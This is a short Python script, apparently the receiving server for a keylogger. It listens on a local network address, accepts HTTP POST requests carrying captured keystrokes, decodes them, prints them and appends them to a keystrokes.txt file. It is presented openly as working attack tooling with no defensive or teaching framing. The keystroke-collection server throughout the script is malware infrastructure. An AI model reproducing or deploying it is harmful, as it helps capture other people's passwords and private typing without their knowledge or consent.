import socket
import select

from datetime import datetime
from urllib.parse import unquote_plus

def add_padding(base64_str):
    return base64_str + '=' * (-len(base64_str) % 4)
    
def get_current_datetime():
    return datetime.now()

def format_keystrokes(data):
    decoded_data = unquote_plus(data)
    if '=' in data:
        keystrokes = decoded_data.split('=', 1)[1]
    elif '+' in data:
        keystrokes = decoded_data.split('+', 1)[1]
    else:
        keystrokes = decoded_data
    return keystrokes
   
def handle_http_post_request(request):
    #Extract the body from the HTTP request
    headers, body = request.split('\r\n\r\n', 1)
    return body

if __name__ == "__main__":
    # Get socket file descriptor as a TCP socket using the IPv4 address family
    listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set some modes on the socket, not required but it's nice for our uses
    listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    address_port = ("192.168.178.26", 8080)
    # leserve address and port
    listener_socket.bind(address_port)
    # listen for connections, a maximum of 1
    listener_socket.listen(1)
    print("Server listening @ 127.0.0.1:8080")
    
    while True:
        # Poll the socket to see if there are any newly written data, note excess data dumped to "_" variables
        read_ready_sockets, _, _ = select.select(
            [listener_socket],  # list of items we want to check for read-readiness (just our socket)
            [],  # list of items we want to check for write-readiness (not interested)
            [],  # list of items we want to check for "exceptional" conditions (also not interested)
            0  # timeout of 0 seconds, makes the method call non-blocking
        )
        # if a value was returned here then we have a connection to read from
        if read_ready_sockets:
            # select.select() returns a list of readable objects, so we'll iterate, but we only expect a single item
            for ready_socket in read_ready_sockets:
                # accept the connection from the client and get its socket object and address
                client_socket, client_address = ready_socket.accept()

                # read up to 4096 bytes of data from the client socket
                client_msg = client_socket.recv(4096).decode('utf-8')
                print(f"Client said: {client_msg}")
                
                if client_msg.startswith('POST'):
                    
                    body = handle_http_post_request(client_msg)
                    keystrokes = format_keystrokes(body)
                    print(f"Received keystrokes: {keystrokes}")
                    
                    with open(f"keystrokes.txt", "a") as file:
                        file.write(body + '\n')                    
                        
                    #Send response to the client
                    
                    response = 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nKeystrokes received!'
                    client_socket.sendall(response.encode('utf-8'))
                
                else:
                    #Send a 400 Bad Request response for any non-POST request
                    
                    response = 'HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n\r\nOnly POST requests are supported.'
                    client_socket.sendall(response.encode('utf-8'))
                
                try:
                    # close the connection
                    client_socket.close()
                except OSError:
                    # client disconnected first, nothing to do
                    pass    